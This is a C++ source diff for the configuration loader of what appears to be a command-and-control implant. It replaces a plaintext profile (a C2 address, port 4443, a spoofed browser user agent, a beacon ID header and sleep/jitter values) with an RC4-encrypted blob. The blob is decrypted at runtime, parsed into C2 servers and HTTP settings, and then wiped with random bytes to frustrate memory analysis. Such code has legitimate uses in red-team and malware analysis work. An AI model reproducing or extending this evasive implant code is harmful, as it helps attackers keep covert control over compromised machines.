@@ -1,29 +1,40 @@
 #include "AgentConfig.h"
+#include "Packer.h"
+#include "Crypt.h"
 #include "utils.h"
 
 AgentConfig::AgentConfig()
 {
-	agent_type          = 0x244829e7;
-	exit_method         = 1;
-	download_chunk_size = 128000;
-	encrypt_key         = (PBYTE)"\x0c\xff\x01\xb5\xfc\x46\x90\x57\x61\x98\x25\xe1\x87\x57\x21\x2e";
-	sleep_delay         = 2;
-	jitter_delay        = 0;
+	ULONG length;
+	CHAR profile[] = "\xfe\x00\x00\x00\x7d\xc4\xec\x55\xef\x21\x50\x7f\xa9\xd4\x8c\x28\xe6\x13\x8b\xa8\x4c\xe5\xac\xaf\x7a\xdb\x75\x27\xc2\xc2\xdd\x62\x65\x55\x64\xba\x76\x92\xdf\x77\x7b\xf3\x76\x1a\xed\x26\x8a\xb2\xc5\x2d\x02\x6a\x45\x9f\x54\x2b\x1b\x37\xfd\x57\x4e\x6e\x4a\x75\x08\xb7\x95\x79\x54\xfe\xa1\xfa\x85\xba\xac\x54\x50\x5b\xf7\xe0\xb8\x4a\x8f\x99\x29\x40\xd2\xb5\xce\xef\x1a\xf3\xc3\xa0\x5e\xe5\xa2\x9f\x9f\x9a\xad\x37\x4d\xc4\x92\x68\x1a\xed\x21\x6e\xa9\x32\x8f\x37\x2f\xa7\xc0\x0a\x79\x8b\x15\x6f\xa5\x12\xed\xde\x89\x31\xdc\x0d\x4a\xab\x93\x06\x85\x06\xc9\x55\x9b\xaa\x98\x41\xdb\x46\x07\x97\xfe\xd2\x14\x4d\x39\x30\x54\x3a\x6e\x76\xef\x36\xd2\xb9\xbb\x0a\x7e\x8c\xc0\x8b\xc2\xc0\xbf\x23\xfe\x32\xdf\x21\x3b\xdb\x65\x56\x78\xa0\x07\xd4\x8c\x9e\x7f\xd1\x0c\x89\x25\x66\x96\x75\xc0\x21\xbb\xaf\xe6\x32\xff\xb0\x51\xa9\x22\x2b\x89\x1c\x50\x2e\x68\x41\x13\xf8\xd4\x4d\x6b\x63\x97\xfc\x4d\x27\xe0\x6c\x5d\xc6\xe4\xd3\x60\x83\xf9\x33\x92\x3a\x06\x7f\xc2\xb7\x95\xb5\x18\xaf\xa9\x57\xb4\xa5\x05\x74\xd6\x5c\xcf\x3d\x38\x84\x08\x20\x04\x9c\xb2\x90\xd4\xfd\x31\x96\x38\x48\x2d\xbc\xec\x19\xfc\xfd\x31\xb6\x25\x5f";
+	
+	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
+	*packer = Packer( (BYTE*)profile, sizeof(profile) );
+	ULONG profileSize = packer->Unpack32();
 
-	// HTTP Config
-	user_agent      = (PBYTE) "Mozilla/5.0 (Windows NT 6.2; rv:20.0) Gecko/20121202 Fire fox/20.0";
-	use_ssl         = TRUE;
-	port	        = 4443;
-	address	        = (PBYTE) "172.16.196.1";
-	uri             = (PBYTE) "/uri";
-	ans_pre_offset  = 0;
-	ans_post_offset = 0;
-	param_name      = (PBYTE) "X-Beacon-Id";
-	method          = (PBYTE) "POST";
-	headers         = NULL;
-}
+	encrypt_key = packer->GetData() + 4 + profileSize;
+	DecryptRC4(packer->GetData()+4, profileSize, encrypt_key, 16);
+	
+	agent_type    = packer->Unpack32();
+	use_ssl       = packer->Unpack8();
+	port          = packer->Unpack32();
+	servers_count = packer->Unpack32();
+	servers = (BYTE**) MemAllocLocal( servers_count * sizeof(LPVOID) );
+	for (int i = 0; i < servers_count; i++) {
+		servers[i] = packer->UnpackBytesCopy(&length);
+	}
 
-void LoadConfig(BYTE* config)
-{
+	http_method   = packer->UnpackBytesCopy(&length);
+	uri           = packer->UnpackBytesCopy(&length);
+	parameter     = packer->UnpackBytesCopy(&length);
+	user_agent    = packer->UnpackBytesCopy(&length);
+	http_headers  = packer->UnpackBytesCopy(&length);
+	ans_pre_size  = packer->Unpack32();
+	ans_post_size = packer->Unpack32();
+	sleep_delay   = packer->Unpack32();
+	jitter_delay  = packer->Unpack32();
 
+	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
+	for (int i = 0; i < sizeof(profile); i++)
+		profile[i] = GenerateRandom32();
 }
